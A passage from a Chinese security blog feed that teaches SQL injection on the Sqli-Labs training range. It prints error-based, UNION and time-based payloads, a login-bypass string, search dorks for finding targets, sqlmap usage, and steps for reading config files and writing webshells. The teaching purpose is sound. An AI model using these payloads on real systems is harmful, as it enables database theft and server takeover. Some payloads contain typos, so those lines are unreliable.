报错注入实战</h4><table><thead><tr><th>函数</th><th>举例（公式）</th></tr></thead><tbody><tr><td>floor()</td><td><code>select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2))</code> 对<code>rand()</code>函数进行操作时产生错误</td></tr><tr><td>extractvalue()</td><td><code>extactvalue(1,concat(0x7e,(select user()),0x7e))</code>对XPATH语法错误产生报错</td></tr><tr><td>updatexml()</td><td><code>select updatexml(1,concat(ox7e,(select user()),ox7e),1)</code>对XPATH语法错误产生报错</td></tr></tbody></table><p><strong>floor()报错注入方法</strong></p><p><strong>Payload:*<em>select count(\</em>) from information_schema.tables group by concat(**需要的回显信息</strong>),floor(rand(0)*2))</p><p><strong>extractvalue()报错注入方法</strong></p><p><strong>Payload:*<em>select extactvalue(1,concat(0x7e,(\</em></strong>需要的回显信息*<em>\</em>),0x7e))</p><p><strong>updatexml()报错注入方法</strong></p><p><strong>Payload:*<em>select updatexml(1,concat(0x7e,(\</em></strong>需要的回显信息*<em>\</em>),0x7e),1)</p><p>注意：updatexml()返回的数据长度不超过32，因此使用substr(str,index,length)进行截取就可。</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> 语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Web安全】一、SQL注入基础</title>
      <link href="2020/03/19/%E3%80%90Web%E5%AE%89%E5%85%A8%E3%80%91%E4%B8%80%E3%80%81SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/"/>
      <url>2020/03/19/%E3%80%90Web%E5%AE%89%E5%85%A8%E3%80%91%E4%B8%80%E3%80%81SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>本文学习SQL注入前的一些必备基础知识，包括了解Web应用框架、搭建后续学习所需的Sqli-Lab模拟靶场、解析SQL注入原理、学习MySQL基础知识（尤为重要的information_schema数据库）和熟悉SQL注入流程，最终使用手工注入方式解决Sqli-Labs/Less-1关卡。</p><a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>随着Web2.0、社交网络、微博等等一系列新型的互联网产品的诞生，基于Web环境的互联网应用越来越广泛，企业信息化的过程中各种应用都架设在<a href="https://baike.baidu.com/item/Web/150564">Web</a>平台上，Web业务的迅速发展也引起黑客们的强烈关注，接踵而至的就是Web安全威胁的凸显，黑客利用网站操作系统的漏洞和Web服务程序的SQL<a href="https://baike.baidu.com/item/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">注入漏洞</a>等得到<a href="https://baike.baidu.com/item/Web%E6%9C%8D%E5%8A%A1%E5%99%A8/8390210">Web服务器</a>的控制权限，轻则篡改网页内容，重则窃取重要内部数据，更为严重的则是在网页中植入<a href="https://baike.baidu.com/item/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/325864">恶意代码</a>，使得网站访问者受到侵害。</p><p>【Web安全】作为一个系列会在本博客连载，大体上从SQL注入、文件上传漏洞、XSS漏洞、代码审计、PHPThink、Python安全编程等方面来解开漏洞的真面目，以及组建模拟环境来训练。</p><hr><h2 id="一、WEB应用框架分析"><a href="#一、WEB应用框架分析" class="headerlink" title="一、WEB应用框架分析"></a>一、WEB应用框架分析</h2><p><strong>Web应用老框架</strong></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32dh9fejj315q0pq479.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32dh9fejj315q0pq479.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200317234659423"></p><p><strong>Web应用新框架</strong></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32dx1249j316i0q47c5.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32dx1249j316i0q47c5.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200317234850985"></p><h2 id="二、SQL注入环境搭建"><a href="#二、SQL注入环境搭建" class="headerlink" title="二、SQL注入环境搭建"></a>二、SQL注入环境搭建</h2><p>使用Docker搭建Sqli-labs靶场。（略）</p><h2 id="三、SQL注入原理"><a href="#三、SQL注入原理" class="headerlink" title="三、SQL注入原理"></a>三、SQL注入原理</h2><p> SQL全称<strong>结构化查询语言StructuredQueryLanguage</strong>，其功能包括查询、操纵、定义和控制四个方面，是一个通用的功能机枪的关系数据库标准语言。</p><p>在B/S模式中，开发者在编写代码时没有对用户的输入数据或者是页面中所携带的信息进行必要的合法性判断。攻击者利用这个机会<strong>提交一段数据库查询代码</strong>，根据程序返回的结果，就可以获得一些数据库信息。</p><p><em>访问网站查询数据的流程</em><br> <img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32eci02bj31i40gcao7.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32eci02bj31i40gcao7.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200317235316671"></p><p>例如对代码进行拼接</p><p><code>http://127.0.0.1:8999/Less-1/?id=1 union select 1,version(),3%23</code> 在查询id=1的同时也可以查看数据库的系统版本。注：%23 -&gt; #</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32efzu5ej31ne0fmn06.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32efzu5ej31ne0fmn06.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200318001249883"></p><h2 id="四、MySQL内置函数"><a href="#四、MySQL内置函数" class="headerlink" title="四、MySQL内置函数"></a>四、MySQL内置函数</h2><p>主要说明一下SQL注入过程中常用函数。</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32el3d3wj31g00q4h1y.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32el3d3wj31g00q4h1y.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200318001443867"></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32er51syj31rw0pq1ke.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32er51syj31rw0pq1ke.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200318001544628"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#部分函数使用说明</span><br><span class="line">Concat(‘str1’,’str2’)</span><br><span class="line">Concat_ws(‘:’,’str1’,’str2’)</span><br><span class="line">Group_concat(‘sr1’,’str2’,’str3’...)</span><br><span class="line"><span class="keyword">Select</span> ‘words’ <span class="keyword">into</span> outfile ‘<span class="operator">/</span>path’</span><br><span class="line"><span class="keyword">Select</span> load_file(‘path’)</span><br><span class="line">substr(‘str1’,index1,length)</span><br></pre></td></tr></table></figure><p>测试URL：<code>http://127.0.0.1/sql/Less-1/?id=-1%27%20union%20select%201,@@version_compile_os,@@datadir%23</code></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32evxj8vj31nq0letio.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32evxj8vj31nq0letio.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200318001731072"></p><h5 id="逻辑运算符：-AND-OR"><a href="#逻辑运算符：-AND-OR" class="headerlink" title="逻辑运算符： AND OR"></a>逻辑运算符： AND OR</h5><p><strong>注意：运算顺序从左到右</strong> </p><p><code>Select * from user where id =1 or 1=1 </code>返回永远为真</p><p>登陆处的SQL语句：<code>select * from users where username=’admin’ and possword=’passwd’</code></p><p>万能登录用户名：<code>’ or ‘1’ = ‘1</code></p><p>测试URL：<code>select * from users where username=’’ or ‘1’ = ‘1’ and possword=’’ or ‘1’ = ‘1’</code></p><p>判断返回值列数<code>and 1=2 union select 1,2,3--+</code></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32f19vn8j31ne0dkmzq.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32f19vn8j31ne0dkmzq.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200318131030436"></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32f53b4vj31nm0g2jv8.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32f53b4vj31nm0g2jv8.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200318131015092"></p><p><code>select user() regexp &#39;&#39;^r0&#39;</code></p><p>时间延时常用语句<code>if(ascii(substr(select user(),1,1))=114,0,sleep(5))</code> </p><h2 id="五、SQL注入流程"><a href="#五、SQL注入流程" class="headerlink" title="五、SQL注入流程"></a>五、SQL注入流程</h2><h4 id="寻找SQL注入点"><a href="#寻找SQL注入点" class="headerlink" title="寻找SQL注入点"></a>寻找SQL注入点</h4><ol><li>目标搜集<ul><li>无特定目标：<code>inurl:php?id=</code></li><li>有特定目标：<code>inurl:php?id= site:target.com</code></li><li>工具爬取： spider（对搜索到的网站进行爬取，识别所有的动态页面）</li></ul></li><li>注入识别<ul><li>手工简单识别<ul><li><code>&#39;</code></li><li><code>and 1=1 / and 1=2</code></li><li><code>and &#39;1&#39;=&#39;1 / and &#39;1&#39;=&#39;2</code></li><li><code>and 1 like 1 / and 1 like 2</code></li></ul></li><li>工具识别<ul><li>Sqlmap -m filename（filename保存检测目标）</li><li>sqlmap -crawl（对目标网站进行爬取并依次进行测试）</li></ul></li><li>高级识别<ul><li>扩展识别广度和深度<ul><li>Sqlmap –level 增加测试级别，对header中相关参数进行测试</li><li>sqlmap -r filename</li></ul></li><li>利用工具提高识别效率<ul><li>BurpSuite + SqlMAo</li><li>BurpSuite拦截所有浏览器访问提交的数据</li><li>BurpSuite扩展插件直接调用SQLmap进行测试</li></ul></li></ul></li><li>代码审计（白盒测试）<ul><li>搜索关键代码和函数<img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32fatx2fj31an0u0b2b.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32fatx2fj31an0u0b2b.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200318135820411"></li><li>梳理业务流程</li></ul></li></ul></li></ol><h4 id="SQL注入流程"><a href="#SQL注入流程" class="headerlink" title="SQL注入流程"></a>SQL注入流程</h4><ul><li><p>信息收集（利用数据库内置函数）</p><ol><li><p>数据库类型 报错页面<img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32fhzejej31nu0ecad3.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32fhzejej31nu0ecad3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200318141122485"></p></li><li><p>数据库版本 @@version、version()</p></li><li><p>数据库用户 user()、SYSTEM_USER</p></li><li><p>数据库权限 super_priv、IS_SRVROLEMEMBER</p></li></ol></li><li><p>数据获取：获取库信息、表信息、列信息、数据信息</p><ol><li>通过语句查询 </li><li>通过暴力破解<code>select * from &#39;爆破字段&#39;</code></li></ol></li><li><p>提权</p><ol><li>执行命令 SQLServer权限</li><li>读文件 读取中间件配置文件、数据库配置文件（可能存在账号密码等信息）<br>读取数据库配置文件示例<br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32fm795fj32490u0tlj.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32fm795fj32490u0tlj.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200319125926981"><br>读取系统配置文件<img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32fpyn8cj319y0u0wun.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32fpyn8cj319y0u0wun.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200319130207545"></li></ol><ol start="3"><li>写文件 写webshell到网站目录</li></ol></li></ul><h2 id="六-、SQL手工注入方法"><a href="#六-、SQL手工注入方法" class="headerlink" title="六 、SQL手工注入方法"></a>六 、SQL手工注入方法</h2><h4 id="MySQL数据库结构（重点：SQL层）"><a href="#MySQL数据库结构（重点：SQL层）" class="headerlink" title="MySQL数据库结构（重点：SQL层）"></a>MySQL数据库结构（重点：SQL层）</h4><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32fu6vpqj31jm0iawnp.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32fu6vpqj31jm0iawnp.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt=" "></p><p>SQL层具有的功能：解析器、查询执行、授权、查询告诉缓存、优化器、查询日志记录</p><ol><li>判断语法、语句、语义</li><li>数据库对象授权情况判断</li><li>解析：将SQL语句解析成执行计划，运行执行计划，生成找数据的方式</li><li>优化：基于算法从执行计划中选择代价最小的</li><li>执行：执行计划</li><li>将取出的数据抽象成表</li><li>查询缓存：缓存之前查询的数据</li></ol><p><strong>MySQL内置库：</strong></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32fxvz9hj31jg0rsh6y.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32fxvz9hj31jg0rsh6y.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200318231903481"></p><p>通过<code>information_schema</code>我们可以窥透整个MySQL的运行情况，也可以查看到数据库中所有的数据信息。</p><p><strong>查询数据核心语法：（十分重要！！！）</strong></p><table><thead><tr><th>功能名称</th><th>查询语句</th></tr></thead><tbody><tr><td>查库</td><td>select schema_name from information_schema.schemata</td></tr><tr><td>查表</td><td>select table_name from information_schema.tables where table_schema=库名</td></tr><tr><td>查列</td><td>select column_name from information_schema.columns where table_name=表名</td></tr><tr><td>查数据</td><td>select 列名 from 库名.表名</td></tr></tbody></table><h4 id="MySQL手工注入方法"><a href="#MySQL手工注入方法" class="headerlink" title="MySQL手工注入方法"></a>MySQL手工注入方法</h4><ol><li>查库示例</li></ol><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32g5y9naj315g0gikjl.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32g5y9naj315g0gikjl.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200318232233796"></p><ol start="2"><li>查表示例</li></ol><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32g9vqdqj31i60gg1ky.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32g9vqdqj31i60gg1ky.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200318232812406"></p><ol start="3"><li>查列示例</li></ol><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32ghlmmsj31hw0fkagr.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32ghlmmsj31hw0fkagr.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200318232942151"><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32gi1zmaj31am0ggqv5.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32gi1zmaj31am0ggqv5.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200318233721606"></p><ol start="4"><li>查数据示例</li></ol><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32glz47zj31bw0sg4qr.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32glz47zj31bw0sg4qr.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200318233136191"></p><p><strong>需要注意的地方</strong></p><ol><li>所有类型sql注入，都是基于查库、表、列语句</li><li>如果数据太多，导致无法返回查询结果（可利用limit限定返回的数量或位置；用concat拼接）</li></ol><p>利用limit限定返回的数量或位置示例：</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32gq3vv3j31460bo4qp.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32gq3vv3j31460bo4qp.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200319114847612"></p><p>利用concat拼接示例：</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32gu5xqmj31ag0c0b29.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32gu5xqmj31ag0c0b29.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200319115155353"></p><ol start="3"><li>借助BurpSuite快速获取数据–布尔盲注</li></ol><h4 id="实战：SQLi-Labs-Less-1解题"><a href="#实战：SQLi-Labs-Less-1解题" class="headerlink" title="实战：SQLi-Labs/Less-1解题"></a>实战：SQLi-Labs/Less-1解题</h4><blockquote><ol><li>测试是否存在sql注入</li></ol><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32h18krhj31nm0emtbc.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32h18krhj31nm0emtbc.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200319115445998"></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32h4tooqj31nw0c2goe.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32h4tooqj31nw0c2goe.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200319115459004"></p><p>由于页面报错，因此很有可能是注入点。</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32hayu1ij31no0f0ju2.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32hayu1ij31no0f0ju2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200319115627009"><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32hbgfqwj31ng0dg0uy.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32hbgfqwj31ng0dg0uy.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200319115648417"></p><p>通过上述测试，可以判断该页面存在SQL注入漏洞。</p><ol start="2"><li>判断字段长度</li></ol><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32hhkmpdj31ne0dyq5e.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32hhkmpdj31ne0dyq5e.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200319115837016"><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32j3wcufj31nc0bwdi4.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32j3wcufj31nc0bwdi4.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1-29"></p><p>由此可知，该字段长度为3</p><ol start="3"><li>利用union联合查询库名<br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32j7z8aej31ne0eqjvt.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32j7z8aej31ne0eqjvt.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200319120204847"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd32jdt1h6j31nk0eugoa.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd32jdt1h6j31nk0eugoa.jpg" 